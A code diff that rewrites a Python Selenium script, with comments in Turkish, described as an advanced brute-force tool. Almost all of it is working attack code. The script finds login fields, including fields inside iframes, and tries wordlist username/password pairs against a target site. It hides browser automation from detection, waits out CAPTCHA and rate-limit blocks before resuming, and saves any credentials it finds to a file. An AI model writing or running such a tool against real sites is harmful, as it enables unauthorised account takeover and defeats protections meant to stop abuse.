@@ -1,325 +1,340 @@
-# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT ---
 import argparse
+import itertools
+import os
 import sys
 import time
-from tqdm import tqdm
-from colorama import Fore, Style, init
-import selenium
+from urllib.parse import urlparse, urlunparse
+
+from bs4 import BeautifulSoup
 from selenium import webdriver
+from selenium.common.exceptions import (ElementNotInteractableException,
+                                        NoSuchElementException,
+                                        StaleElementReferenceException,
+                                        TimeoutException)
+from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.firefox.service import Service as FirefoxService
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
-import logging
-import os
-import re
+from selenium.webdriver.support.ui import WebDriverWait
+from webdriver_manager.chrome import ChromeDriverManager
+from webdriver_manager.firefox import GeckoDriverManager
 
 # --- Renkler ---
-RESET = "\033[0m"
-KIRMIZI = "\033[31m"
-YESIL = "\033[32m"
-SARI = "\033[33m"
-MAVI = "\033[34m"
+R = "\033[1;31m"
+G = "\033[1;32m"
+Y = "\033[1;33m"
+B = "\033[1;34m"
+C = "\033[1;36m"
+W = "\033[0m"
 
-# --- Logger Kurulumu ---
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+def print_status(message, color=W):
+    """Renkli durum mesajları yazdırır."""
+    print(f"{color}[*] {message}{W}")
 
-def get_driver(browser_name, driver_path=None):
-    """Belirtilen tarayıcı için WebDriver'ı başlatır."""
-    try:
-        if browser_name.lower() == 'firefox':
-            options = webdriver.FirefoxOptions()
-            # options.add_argument("--headless") # Headless mod şu an için önerilmiyor.
-            logger.info("Firefox WebDriver başlatılıyor...")
-            return webdriver.Firefox(options=options)
-        elif browser_name.lower() == 'chrome':
-            options = webdriver.ChromeOptions()
-            # options.add_argument("--headless") # Headless mod şu an için önerilmiyor.
-            options.add_experimental_option("excludeSwitches", ["enable-automation"])
-            options.add_experimental_option('useAutomationExtension', False)
-            logger.info("Chrome WebDriver başlatılıyor...")
-            if driver_path:
-                return webdriver.Chrome(executable_path=driver_path, options=options)
-            else:
-                return webdriver.Chrome(options=options)
-        else:
-            logger.error(f"Desteklenmeyen tarayıcı: {browser_name}")
-            return None
-    except WebDriverException as e:
-        logger.error(f"{KIRMIZI}WebDriver başlatılırken hata oluştu: {e}{RESET}")
-        if "session not created" in str(e) or "This version of ChromeDriver" in str(e):
-             logger.error(f"{SARI}Tarayıcı sürümünüz (Chrome/Firefox) ile WebDriver sürümü uyumsuz olabilir.{RESET}")
-             logger.error(f"{SARI}Lütfen tarayıcınızı güncelleyin veya doğru WebDriver'ı indirin.{RESET}")
-        elif "net::ERR_NAME_NOT_RESOLVED" in str(e):
-            logger.error(f"{KIRMIZI}Adres çözümlenemedi. URL'yi kontrol edin veya internet bağlantınızı doğrulayın.{RESET}")
-        return None
+def print_error(message):
+    """Hata mesajları yazdırır."""
+    print(f"{R}[-] {message}{W}")
 
-def find_element_intelligently(driver, strategy, value, timeout=10):
-    """Öğeyi bulmak için bekler."""
-    try:
-        return WebDriverWait(driver, timeout).until(
-            EC.presence_of_element_located((strategy, value))
-        )
-    except TimeoutException:
-        return None
+def print_success(message):
+    """Başarı mesajları yazdırır."""
+    print(f"{G}[+] {message}{W}")
 
-def find_login_elements(driver):
-    """Giriş formundaki kullanıcı adı, şifre ve gönderim butonu öğelerini akıllıca bulur."""
-    username_field = None
-    password_field = None
-    submit_button = None
-
-    # Olası iframe'leri kontrol et
-    iframes = driver.find_elements(By.TAG_NAME, 'iframe')
-    for iframe in iframes:
-        try:
-            logger.info(f"{SARI}Iframe'e geçiliyor...{RESET}")
-            driver.switch_to.frame(iframe)
-            username_field, password_field, submit_button = find_elements_in_current_frame(driver)
-            if username_field and password_field:
-                return username_field, password_field, submit_button, True # Iframe'de bulundu
-            driver.switch_to.default_content() # Ana sayfaya geri dön
-        except Exception as e:
-            logger.warning(f"Iframe'e geçilirken hata: {e}")
-            driver.switch_to.default_content()
-
-    # Iframe'de bulunamazsa ana sayfada ara
-    username_field, password_field, submit_button = find_elements_in_current_frame(driver)
-    return username_field, password_field, submit_button, False
-
-def find_elements_in_current_frame(driver):
-    """Mevcut çerçevedeki giriş öğelerini bulur."""
-    # Olası kullanıcı adı tanımlayıcıları
-    username_locators = [
-        (By.ID, 'username'), (By.ID, 'user'), (By.ID, 'login'), (By.ID, 'email'),
-        (By.NAME, 'username'), (By.NAME, 'user'), (By.NAME, 'login'), (By.NAME, 'email'), (By.NAME, 'session[username_or_email]'),
-        (By.CSS_SELECTOR, "[placeholder*='sername']"), (By.CSS_SELECTOR, "[placeholder*='mail']"),
-        (By.XPATH, "//*[@type='email']"), (By.XPATH, "//*[@type='text' and (contains(@name, 'user') or contains(@name, 'login'))]")
-    ]
-    # Olası şifre tanımlayıcıları
-    password_locators = [
-        (By.ID, 'password'), (By.ID, 'pass'),
-        (By.NAME, 'password'), (By.NAME, 'pass'), (By.NAME, 'session[password]'),
-        (By.CSS_SELECTOR, "[placeholder*='assword']"),
-        (By.XPATH, "//*[@type='password']")
-    ]
-    # Olası gönderim butonu tanımlayıcıları
-    submit_locators = [
-        (By.TAG_NAME, 'button'),
-        (By.XPATH, "//*[@type='submit']"),
-        (By.CSS_SELECTOR, "button[type='submit']"),
-        (By.ID, 'login-button'),(By.ID, 'login_button'), (By.ID, 'submit-button')
-    ]
-
-    username_field, password_field, submit_button = None, None, None
-
-    logger.info("Kullanıcı adı alanı aranıyor...")
-    for by, value in username_locators:
-        try:
-            username_field = find_element_intelligently(driver, by, value, 2)
-            if username_field:
-                logger.info(f"{YESIL}Kullanıcı adı alanı bulundu: {by}={value}{RESET}")
-                break
-        except:
-            continue
-
-    logger.info("Şifre alanı aranıyor...")
-    for by, value in password_locators:
-        try:
-            password_field = find_element_intelligently(driver, by, value, 2)
-            if password_field:
-                logger.info(f"{YESIL}Şifre alanı bulundu: {by}={value}{RESET}")
-                break
-        except:
-            continue
-
-    logger.info("Giriş butonu aranıyor...")
-    for by, value in submit_locators:
-        try:
-            # Sadece görünür ve tıklanabilir butonları seç
-            element = find_element_intelligently(driver, by, value, 2)
-            if element and element.is_displayed() and element.is_enabled():
-                 # "Sign up" veya "Kaydol" gibi kelimeleri içeren butonları ele
-                if any(keyword in element.text.lower() for keyword in ['kaydol', 'sign up', 'register']):
-                    continue
-                submit_button = element
-                logger.info(f"{YESIL}Giriş butonu bulundu: {by}={value}{RESET} (Metin: '{element.text}')")
-                break
-        except:
-            continue
-
-    return username_field, password_field, submit_button
-
-def get_field_length_limits(field):
-    """Bir giriş alanının minlength ve maxlength özniteliklerini alır."""
-    min_len = field.get_attribute("minlength")
-    max_len = field.get_attribute("maxlength")
-    return int(min_len) if min_len and min_len.isdigit() else 0, int(max_len) if max_len and max_len.isdigit() else 1000
-
-def filter_wordlist(wordlist_path, min_user_len, max_user_len, min_pass_len, max_pass_len):
-    """Kelime listesini alan uzunluklarına göre filtreler."""
-    filtered_list = []
-    logger.info("Kelime listesi filtreleniyor...")
-    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
-        for line in f:
-            line = line.strip()
-            if ':' not in line:
-                continue
-            user, pwd = line.split(':', 1)
-            if (min_user_len <= len(user) <= max_user_len) and \
-               (min_pass_len <= len(pwd) <= max_pass_len):
-                filtered_list.append((user, pwd))
-    logger.info(f"{YESIL}{len(filtered_list)} geçerli kombinasyon bulundu.{RESET}")
-    return filtered_list
-
-def fix_url(url):
-    """Yaygın URL yazım hatalarını düzeltir."""
-    if not re.match(r'^(http|https)://', url):
-        logger.warning(f"URL formatı geçersiz görünüyor: '{url}'. 'https://' ekleniyor.")
-        return 'https://' + url.lstrip('htps:/')
+def correct_url(url):
+    """URL'deki yaygın yazım hatalarını düzeltir."""
+    if url.startswith("http//") or url.startswith("https//"):
+        url = url.replace("//", "://", 1)
+    if not url.startswith("http"):
+        print_status(f"URL'ye 'https://' ekleniyor: {url}", Y)
+        url = "https://" + url
     return url
 
-def main(url, wordlist, browser, driver_path, cooldown, rate_limit):
-    driver = get_driver(browser, driver_path)
-    if not driver:
-        return
-
-    original_url = fix_url(url)
-    driver.get(original_url)
-
+def get_driver(browser_name, headless=False):
+    """Belirtilen tarayıcı için WebDriver'ı başlatır."""
+    print_status(f"{browser_name.capitalize()} başlatılıyor...")
     try:
-        # --- YÜKLEME EKRANI BEKLEME ---
-        # Sayfanın tam olarak yüklenmesini ve potansiyel bir DDoS koruma ekranının
-        # geçmesini beklemek için kullanıcı adı alanının görünür olmasını bekliyoruz.
-        logger.info(f"{SARI}Sayfanın ve olası DDOS korumasının yüklenmesi bekleniyor... (Max 30 saniye){RESET}")
-        WebDriverWait(driver, 30).until(
-            EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password' or @type='submit') and not(contains(@style,'display:none') or contains(@style,'visibility:hidden'))] | //button"))
-        )
-        logger.info(f"{YESIL}Sayfa yüklendi, giriş formu elemanları aranıyor...{RESET}")
+        if browser_name.lower() == 'chrome':
+            options = webdriver.ChromeOptions()
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_argument("--log-level=3")
+            options.add_argument("--ignore-certificate-errors")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            if headless:
+                options.add_argument("--headless")
+            service = ChromeService(ChromeDriverManager().install())
+            driver = webdriver.Chrome(service=service, options=options)
+        elif browser_name.lower() == 'firefox':
+            options = webdriver.FirefoxOptions()
+            options.accept_insecure_certs = True
+            if headless:
+                options.add_argument("--headless")
+            service = FirefoxService(GeckoDriverManager().install())
+            driver = webdriver.Firefox(service=service, options=options)
+        else:
+            print_error(f"Desteklenmeyen tarayıcı: {browser_name}")
+            sys.exit(1)
         
-        username_field, password_field, submit_button, in_iframe = find_login_elements(driver)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        return driver
+    except Exception as e:
+        print_error(f"WebDriver başlatılırken hata oluştu: {e}")
+        print_error("Lütfen tarayıcınızın (Chrome/Firefox) kurulu ve güncel olduğundan emin olun.")
+        sys.exit(1)
 
-        if not username_field or not password_field:
-            logger.error(f"{KIRMIZI}Giriş alanları otomatik olarak bulunamadı.{RESET}")
-            logger.error(f"{SARI}Lütfen sayfa kaynağını kontrol edin veya manuel olarak tanımlayın.{RESET}")
-            driver.quit()
-            return
+def find_element_robustly(driver, selectors):
+    """Bir öğeyi birden çok seçiciyle sağlam bir şekilde bulur."""
+    for selector in selectors:
+        try:
+            return driver.find_element(By.CSS_SELECTOR, selector)
+        except NoSuchElementException:
+            continue
+    return None
 
-        min_user_len, max_user_len = get_field_length_limits(username_field)
-        min_pass_len, max_pass_len = get_field_length_limits(password_field)
-
-        logger.info(f"Kullanıcı adı uzunluk limiti: min={min_user_len}, max={max_user_len}")
-        logger.info(f"Şifre uzunluk limiti: min={min_pass_len}, max={max_pass_len}")
-
-        if not os.path.exists(wordlist):
-            logger.error(f"{KIRMIZI}Kelime listesi bulunamadı: {wordlist}{RESET}")
-            driver.quit()
-            return
-            
-        combos = filter_wordlist(wordlist, min_user_len, max_user_len, min_pass_len, max_pass_len)
-        
-        if not combos:
-            logger.warning(f"{SARI}Filtreleme sonrası denenecek kombinasyon kalmadı.{RESET}")
-            driver.quit()
-            return
-
-        total_combos = len(combos)
-        logger.info(f"Brute force denemeleri başlıyor: {total_combos} kombinasyon denenecek.")
-        
-        attempts = 0
-        for i, (username, password) in enumerate(combos):
+def find_login_elements(driver):
+    """Giriş formunu ve öğelerini (iframe dahil) bulur."""
+    print_status("Giriş formu ve öğeleri aranıyor...")
+    
+    # iframe'leri kontrol et
+    iframes = driver.find_elements(By.TAG_NAME, "iframe")
+    if iframes:
+        print_status(f"{len(iframes)} adet iframe bulundu. İçleri kontrol ediliyor...")
+        for index, frame in enumerate(iframes):
             try:
-                # Her denemeden önce iframe'e tekrar geçiş yap (eğer gerekiyorsa)
-                if in_iframe:
-                    driver.switch_to.default_content()
-                    iframe = driver.find_elements(By.TAG_NAME, 'iframe')[0] # Varsayım: ilk iframe
-                    driver.switch_to.frame(iframe)
-                
-                # Elementlerin taze referanslarını al
-                current_username_field = find_element_intelligently(driver, By.ID, username_field.get_attribute('id')) or username_field
-                current_password_field = find_element_intelligently(driver, By.ID, password_field.get_attribute('id')) or password_field
-                
-                # --- Gelişmiş Giriş Simülasyonu ---
-                # "Please fill out this field" hatasını önlemek için JS kullanılıyor.
-                driver.execute_script("arguments[0].value = arguments[1];", current_username_field, username)
-                driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", current_username_field)
-                driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", current_username_field)
-                
-                driver.execute_script("arguments[0].value = arguments[1];", current_password_field, password)
-                driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", current_password_field)
-                driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", current_password_field)
-
-                time.sleep(0.5) # Girişlerin işlenmesi için kısa bir bekleme
-
-                if submit_button:
-                    current_submit_button = find_element_intelligently(By.ID, submit_button.get_attribute('id')) or submit_button
-                    current_submit_button.click()
-                else: # Buton bulunamazsa Enter tuşuna basmayı dene
-                    current_password_field.send_keys(selenium.webdriver.common.keys.Keys.ENTER)
-
-                logger.info(f"[{i+1}/{total_combos}] Deneniyor -> Kullanıcı: {username} | Şifre: {password}")
-                
-                # URL değişti mi diye kontrol et (başarılı giriş göstergesi)
-                time.sleep(2) # Sayfanın yönlenmesi için bekle
-                if driver.current_url != original_url and "login" not in driver.current_url.lower():
-                    logger.info(f"{YESIL}Giriş Başarılı!{RESET}")
-                    logger.info(f"{YESIL}Kullanıcı Adı: {username}{RESET}")
-                    logger.info(f"{YESIL}Şifre: {password}{RESET}")
-                    break
-                
-                attempts += 1
-                if attempts >= rate_limit:
-                    logger.warning(f"{SARI}Oran limiti ({rate_limit} deneme) doldu. Beklemeye alınıyor...{RESET}")
-                    page_source = driver.page_source.lower()
-                    if "captcha" in page_source or "too many attempts" in page_source or "çok fazla deneme" in page_source:
-                        logger.warning(f"{KIRMIZI}CAPTCHA veya deneme limiti tespit edildi! {cooldown} saniye bekleniyor...{RESET}")
-                        time.sleep(cooldown)
-                        logger.info("Denemelere devam ediliyor...")
-                        attempts = 0 # Sayacı sıfırla
-                        driver.get(original_url) # Sayfayı yenile
-                        # Sayfa yenilendiği için elemanları tekrar bulmak gerekebilir
-                        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password')]")))
-                        username_field, password_field, submit_button, in_iframe = find_login_elements(driver)
-
-
-            except (NoSuchElementException, TimeoutException) as e:
-                logger.error(f"{KIRMIZI}Sayfa elemanları bulunamadı veya zaman aşımına uğradı. Sayfa yapısı değişmiş olabilir.{RESET}")
-                logger.error(f"Hata: {e}")
-                logger.info("Sayfa yenileniyor ve devam ediliyor...")
-                driver.get(original_url)
-                # Bekleme ve elemanları tekrar bulma
-                WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password')]")))
-                username_field, password_field, submit_button, in_iframe = find_login_elements(driver)
-                continue
+                driver.switch_to.frame(frame)
+                print_status(f"{index}. iframe'e geçildi.")
+                elements = find_elements_in_context(driver)
+                if all(elements.values()):
+                    print_success("Giriş öğeleri iframe içinde bulundu!")
+                    return elements
+                driver.switch_to.default_content()
             except Exception as e:
-                logger.error(f"{KIRMIZI}Beklenmedik bir hata oluştu: {e}{RESET}")
-                time.sleep(2)
-    
-    except (TimeoutException, WebDriverException) as e:
-         if "net::ERR_NAME_NOT_RESOLVED" in str(e) or "dnsNotFound" in str(e).lower():
-            logger.error(f"{KIRMIZI}DNS çözümleme hatası: URL'ye ulaşılamıyor -> {original_url}{RESET}")
-            logger.error(f"{KIRMIZI}Lütfen URL'yi ve internet bağlantınızı kontrol edin.{RESET}")
-         else:
-            logger.error(f"{KIRMIZI}Sayfa yüklenirken bir hata oluştu veya zaman aşımına uğradı.{RESET}")
-            logger.error(f"{KIRMIZI}Olası Nedenler: İnternet bağlantısı sorunları, sitenin yavaş olması veya DDOS koruması.{RESET}")
-            logger.error(f"Hata Detayı: {e}")
+                print_error(f"Iframe'e geçilirken hata: {e}")
+                driver.switch_to.default_content()
 
-    finally:
-        logger.info("Tarayıcı kapatılıyor.")
-        driver.quit()
+    # Ana sayfada ara
+    elements = find_elements_in_context(driver)
+    if all(elements.values()):
+        print_success("Giriş öğeleri ana sayfada bulundu!")
+        return elements
+        
+    print_error("Giriş formu veya öğeleri bulunamadı.")
+    return None
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="Gelişmiş Brute Force Aracı")
-    parser.add_argument("url", help="Hedef URL (örn: https://site.com/login)")
-    parser.add_argument("-w", "--wordlist", required=True, help="Kullanıcı:Şifre formatında kelime listesi dosyası.")
-    parser.add_argument("-b", "--browser", default="firefox", choices=['chrome', 'firefox'], help="Kullanılacak tarayıcı (chrome/firefox). Varsayılan: firefox")
-    parser.add_argument("-d", "--driver-path", default=None, help="Chrome için spesifik bir chromedriver yolu.")
-    parser.add_argument("-cd", "--cooldown", type=int, default=60, help="CAPTCHA tespit edildiğinde bekleme süresi (saniye). Varsayılan: 60")
-    parser.add_argument("-rl", "--rate-limit", type=int, default=15, help="Kaç denemede bir CAPTCHA kontrolü yapılacağı. Varsayılan: 15")
+def find_elements_in_context(driver):
+    """Mevcut bağlamda (ana sayfa veya iframe) öğeleri arar."""
+    # Yaygın seçiciler
+    user_selectors = [
+        'input[type="email"]', 'input[type="text"][name*="user"]', 'input#username', 
+        'input[name="username"]', 'input[placeholder*="user"]', 'input[autocomplete="username"]'
+    ]
+    pass_selectors = [
+        'input[type="password"]', 'input#password', 'input[name="password"]', 
+        'input[placeholder*="assword"]', 'input[autocomplete="current-password"]'
+    ]
+    submit_selectors = [
+        'button[type="submit"]', 'input[type="submit"]', 'button[id*="login"]', 
+        'button[name*="login"]', 'button:contains("Log In")', 'button:contains("Sign In")'
+    ]
+
+    username_field = find_element_robustly(driver, user_selectors)
+    password_field = find_element_robustly(driver, pass_selectors)
+    submit_button = find_element_robustly(driver, submit_selectors)
     
+    return {"username": username_field, "password": password_field, "submit": submit_button}
+
+def get_input_length_constraints(username_field, password_field):
+    """Kullanıcı adı ve şifre alanlarının uzunluk kısıtlamalarını alır."""
+    constraints = {
+        'user': {'min': 0, 'max': float('inf')},
+        'pass': {'min': 0, 'max': float('inf')}
+    }
+    try:
+        if username_field:
+            min_len = username_field.get_attribute('minlength')
+            max_len = username_field.get_attribute('maxlength')
+            if min_len: constraints['user']['min'] = int(min_len)
+            if max_len: constraints['user']['max'] = int(max_len)
+        if password_field:
+            min_len = password_field.get_attribute('minlength')
+            max_len = password_field.get_attribute('maxlength')
+            if min_len: constraints['pass']['min'] = int(min_len)
+            if max_len: constraints['pass']['max'] = int(max_len)
+            
+        print_status(f"Alan Kısıtlamaları: Kullanıcı Adı (min: {constraints['user']['min']}, max: {constraints['user']['max']}), Şifre (min: {constraints['pass']['min']}, max: {constraints['pass']['max']})", C)
+    except Exception as e:
+        print_error(f"Uzunluk kısıtlamaları alınırken hata: {e}")
+    return constraints
+
+def filter_wordlist(filepath, user_constraints, pass_constraints):
+    """Kelime listesini uzunluk kısıtlamalarına göre filtreler."""
+    print_status(f"'{filepath}' kelime listesi kısıtlamalara göre filtreleniyor...")
+    filtered_list = []
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                word = line.strip()
+                if (user_constraints['min'] <= len(word) <= user_constraints['max']) or \
+                   (pass_constraints['min'] <= len(word) <= pass_constraints['max']):
+                    filtered_list.append(word)
+        print_success(f"Kelime listesi filtrelendi. {len(filtered_list)} uygun kelime bulundu.")
+        return filtered_list
+    except FileNotFoundError:
+        print_error(f"Kelime listesi dosyası bulunamadı: {filepath}")
+        sys.exit(1)
+
+def attempt_login(driver, username_field, password_field, submit_button, username, password):
+    """Bir giriş denemesi yapar."""
+    try:
+        # Değerleri girmek için JavaScript kullan
+        driver.execute_script("arguments[0].value = arguments[1];", username_field, username)
+        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", username_field)
+        driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", username_field)
+        
+        driver.execute_script("arguments[0].value = arguments[1];", password_field, password)
+        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", password_field)
+        driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", password_field)
+
+        time.sleep(0.5) # Girişlerin işlenmesi için kısa bir bekleme
+
+        # Tıklama için JavaScript kullan
+        driver.execute_script("arguments[0].click();", submit_button)
+        return True
+    except (ElementNotInteractableException, StaleElementReferenceException) as e:
+        print_error(f"Giriş elemanları ile etkileşimde hata: {e}")
+        return False
+    except Exception as e:
+        print_error(f"Giriş denemesi sırasında beklenmedik hata: {e}")
+        return False
+
+def check_for_rate_limiting(driver, attempt_count):
+    """Hız sınırlaması veya captcha kontrolü yapar."""
+    if attempt_count > 0 and attempt_count % 15 == 0: # Her 15 denemede bir kontrol et
+        print_status("Hız sınırlaması kontrol ediliyor...", Y)
+        page_source = driver.page_source.lower()
+        limit_keywords = ["captcha", "too many attempts", "rate limit", "çok fazla deneme"]
+        if any(keyword in page_source for keyword in limit_keywords):
+            print_error("Hız sınırlaması veya CAPTCHA tespit edildi!")
+            return True
+    return False
+
+def main():
+    parser = argparse.ArgumentParser(description=f"{C}Gelişmiş Brute-Force Aracı{W}")
+    parser.add_argument("url", help="Hedef URL (örn: https://example.com/login)")
+    parser.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Kullanıcı adı ve şifreler için kelime listesi yolu")
+    parser.add_argument("-b", "--browser", default="firefox", choices=["chrome", "firefox"], help="Kullanılacak tarayıcı (chrome/firefox)")
+    parser.add_argument("--headless", action="store_true", help="Tarayıcıyı görünmez modda çalıştır")
+    parser.add_argument("--cooldown", type=int, default=300, help="Hız sınırlaması tespit edildiğinde bekleme süresi (saniye)")
+
     args = parser.parse_args()
+    
+    target_url = correct_url(args.url)
+    wordlist_path = args.wordlist
+    
+    if not os.path.exists(wordlist_path):
+        print_error(f"Kelime listesi dosyası bulunamadı: {wordlist_path}")
+        print_error("Lütfen '-w' parametresi ile geçerli bir dosya yolu belirtin.")
+        sys.exit(1)
 
-    main(args.url, args.wordlist, args.browser, args.driver_path, args.cooldown, args.rate_limit)
+    # --- İlk Adım: Sayfayı analiz et ve kısıtlamaları al ---
+    driver = None
+    try:
+        driver = get_driver(args.browser, args.headless)
+        print_status(f"Hedef analiz ediliyor: {target_url}")
+        driver.get(target_url)
+        WebDriverWait(driver, 15).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+        
+        login_elements = find_login_elements(driver)
+        if not login_elements or not all(login_elements.values()):
+            print_error("Giriş öğeleri bulunamadı. Betik sonlandırılıyor.")
+            return
 
-# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT-BITIS --- 
+        constraints = get_input_length_constraints(login_elements['username'], login_elements['password'])
+        
+    except TimeoutException:
+        print_error(f"Sayfa yüklenemedi (Zaman aşımı): {target_url}")
+        return
+    except Exception as e:
+        print_error(f"Sayfa analizi sırasında hata: {e}")
+        return
+    finally:
+        if driver:
+            driver.quit()
+
+    # --- İkinci Adım: Kelime listesini filtrele ve saldırıya başla ---
+    wordlist = filter_wordlist(wordlist_path, constraints['user'], constraints['pass'])
+    combos = list(itertools.product(wordlist, repeat=2)) # user, pass
+    
+    print_status(f"{len(combos)} olası kombinasyon denenecek.", B)
+
+    start_index = 0
+    total_attempts = 0
+    
+    while start_index < len(combos):
+        driver = None
+        try:
+            driver = get_driver(args.browser, args.headless)
+            initial_url_netloc = urlparse(target_url).netloc
+            
+            # Kaldığı yerden devam et
+            for i in range(start_index, len(combos)):
+                username, password = combos[i]
+                
+                # Sadece geçerli uzunluktaki kombinasyonları dene
+                if not (constraints['user']['min'] <= len(username) <= constraints['user']['max'] and \
+                        constraints['pass']['min'] <= len(password) <= constraints['pass']['max']):
+                    continue
+
+                total_attempts += 1
+                print_status(f"Deneme {total_attempts}/{len(combos)} -> Kullanıcı: {username}, Şifre: {password}")
+
+                # Her denemeden önce sayfaya git
+                driver.get(target_url)
+                WebDriverWait(driver, 15).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+                
+                login_elements = find_login_elements(driver)
+                if not login_elements or not all(login_elements.values()):
+                    print_error("Giriş öğeleri yeniden bulunamadı. Bu deneme atlanıyor.")
+                    continue
+
+                attempt_login(driver, login_elements['username'], login_elements['password'], login_elements['submit'], username, password)
+                
+                # Sonucun yüklenmesi için bekle
+                time.sleep(3) 
+
+                current_url_netloc = urlparse(driver.current_url).netloc
+                
+                # Başarı kontrolü: URL değişti mi?
+                if current_url_netloc != initial_url_netloc or "dashboard" in driver.current_url or "logout" in driver.page_source.lower():
+                    print_success(f"Başarılı Giriş! -> Kullanıcı: {username}, Şifre: {password}")
+                    print_success(f"Başarılı olunan URL: {driver.current_url}")
+                    with open("credentials.txt", "w") as f:
+                        f.write(f"URL: {target_url}\n")
+                        f.write(f"Username: {username}\n")
+                        f.write(f"Password: {password}\n")
+                    print_success("Kimlik bilgileri 'credentials.txt' dosyasına kaydedildi.")
+                    return # Başarılı olunca çık
+
+                # Hız sınırlaması kontrolü
+                if check_for_rate_limiting(driver, total_attempts):
+                    start_index = i # Kaldığı indeksi kaydet
+                    print_error(f"{args.cooldown} saniye bekleniyor...")
+                    driver.quit() # Tarayıcıyı kapat
+                    time.sleep(args.cooldown)
+                    print_status("Bekleme süresi bitti, devam ediliyor...")
+                    break # İç döngüyü kır ve yeni tarayıcı ile yeniden başla
+            else:
+                # for döngüsü break olmadan biterse
+                start_index = len(combos) # Tüm kombinasyonlar denendi
+
+        except Exception as e:
+            print_error(f"Ana döngüde bir hata oluştu: {e}")
+            start_index += 1 # Hatalı kombinasyonu atla ve devam et
+            time.sleep(5)
+        finally:
+            if driver:
+                driver.quit()
+    
+    print_status("Tüm kombinasyonlar denendi. Başarılı giriş bulunamadı.")
+
+if __name__ == "__main__":
+    main() 
